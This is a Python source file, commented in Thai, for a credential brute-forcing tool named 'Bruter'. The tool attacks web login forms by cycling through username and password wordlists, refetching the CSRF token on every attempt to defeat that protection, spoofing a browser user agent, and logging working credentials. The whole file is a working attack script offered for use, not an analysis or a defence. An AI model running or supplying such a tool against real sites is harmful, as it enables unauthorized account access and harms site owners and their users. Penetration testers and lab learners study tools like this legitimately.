#!/usr/bin/env python3
"""
Bruter - Brute force login form ที่มี CSRF/Token โดยดึง token ใหม่ทุก request
รับ --url, --params (หรือ --user-field/--pass-field/--csrf-field), --user-file, --pass-file
"""
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

import requests
from bs4 import BeautifulSoup

# ชื่อ field ที่น่าจะเป็น CSRF (ใช้ดึงจาก hidden input)
DEFAULT_CSRF_NAMES = ("user_token", "csrf_token", "csrf", "token", "_token", "authenticity_token", "sync", "_sync")


def get_csrf_token(url: str, token_name: str, session: requests.Session | None = None, timeout: int = 10) -> str | None:
    """ดึงค่า CSRF จากหน้า form (hidden input). ใช้ session.get ถ้ามี เพื่อให้ได้ cookie จากการโหลดหน้า."""
    try:
        if session is not None:
            r = session.get(url, timeout=timeout)
        else:
            r = requests.get(url, timeout=timeout)
        r.raise_for_status()
        html = r.text or ""
    except Exception:
        return None
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"type": "hidden", "name": token_name})
    if inp and inp.get("value"):
        return inp.get("value")
    m = re.search(
        rf'<input[^>]+name=["\']({re.escape(token_name)})["\'][^>]+value=["\']([^"\']+)["\']',
        html,
        re.I,
    )
    if m:
        return m.group(2)
    m2 = re.search(
        rf'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']({re.escape(token_name)})["\']',
        html,
        re.I,
    )
    if m2:
        return m2.group(1)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="Brute force login form with CSRF token refresh")
    parser.add_argument("--url", required=True, help="Form action URL (POST)")
    parser.add_argument("--user-field", default="username", help="Form field name for username")
    parser.add_argument("--pass-field", default="password", help="Form field name for password")
    parser.add_argument("--csrf-field", default=None, help="Form field name for CSRF token (optional)")
    parser.add_argument("--extra", default="", help="Fixed params as key=val&key2=val2 (optional)")
    parser.add_argument("--user-file", default=None, help="Path to file with usernames (one per line)")
    parser.add_argument("--pass-file", required=True, help="Path to file with passwords (one per line)")
    parser.add_argument("--failure-string", default="incorrect", help="Substring in response body indicating login failed (or several separated by |)")
    parser.add_argument(
        "--success-string",
        default="logout|logged in|welcome|dashboard|admin panel",
        help="Substring(s) in response body indicating login success (separated by |). "
             "If empty, only redirect-away heuristic is used.",
    )
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--output", default=None, help="Optional log file to append CREDENTIAL lines")
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Print each attempt (username:password) while brute forcing",
    )
    args = parser.parse_args()

    users: list[str] = []
    if args.user_file and Path(args.user_file).exists():
        users = [line.strip() for line in Path(args.user_file).read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()]
    if not users:
        users = ["admin", "root", "administrator", "user", "test", "guest"]

    pass_path = Path(args.pass_file)
    if not pass_path.exists():
        print(f"[!] Pass file not found: {pass_path}", file=sys.stderr)
        sys.exit(2)

    passwords = [line.strip() for line in pass_path.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()]
    if not passwords:
        print("[!] No passwords in file.", file=sys.stderr)
        sys.exit(2)

    extra_dict: dict[str, str] = {}
    if args.extra:
        for part in args.extra.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                extra_dict[k.strip()] = v.strip()

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

    found: list[tuple[str, str]] = []
    csrf_name = args.csrf_field
    url = args.url.strip()

    attempts = 0

    for user in users:
        for password in passwords:
            data: dict[str, str] = dict(extra_dict)
            data[args.user_field] = user
            data[args.pass_field] = password

            if csrf_name:
                token = get_csrf_token(url, csrf_name, session=session, timeout=args.timeout)
                if token is not None:
                    data[csrf_name] = token

            try:
                attempts += 1
                if args.verbose:
                    print(f"[*] Trying {user}:{password}")
                r = session.post(url, data=data, timeout=args.timeout, allow_redirects=True)
                body = (r.text or "").lower()

                # ตรวจ failure ตามข้อความที่ผู้ใช้กำหนด (ผิด password / login failed ฯลฯ)
                fail_parts = [s.strip().lower() for s in args.failure_string.split("|") if s.strip()]
                fail_str = any(p in body for p in fail_parts) if fail_parts else False

                # ตรวจ success จากข้อความเชิงบวก (เช่น logout, welcome, dashboard)
                success_parts = [s.strip().lower() for s in args.success_string.split("|") if s.strip()]
                has_success_marker = any(p in body for p in success_parts) if success_parts else False

                # Success heuristic:
                # 1) ไม่มี failure string
                # 2) และ (มี success marker หรือ redirect ไปหน้าอื่นที่ไม่ใช่ login)
                final_url = (r.url or "")
                # ถ้า POST แล้วถูก redirect ไป URL ที่ไม่มี login.php = มักแปลว่าเข้าได้
                redirected_away = bool(r.history) and "login" not in final_url.lower().split("/")[-1]
                success = (not fail_str) and (has_success_marker or redirected_away)

                if success:
                    found.append((user, password))
                    line = f"CREDENTIAL:\t{user}\t{password}"
                    print(line)
                    if args.output:
                        p = Path(args.output)
                        p.write_text(p.read_text(encoding="utf-8", errors="ignore") + line + "\n", encoding="utf-8")
                    break  # เจอ password ของ user นี้แล้ว ไปลอง user ถัดไป
            except Exception:
                continue
        # ถ้าเจอ credential แล้ว ให้หยุด loop username ด้วย (ใช้คู่แรกที่สำเร็จ)
        if found:
            break

    if not found and not args.verbose:
        print(f"[*] Tried {attempts} combinations, no valid credential found.")

    sys.exit(0 if found else 1)


if __name__ == "__main__":
    main()
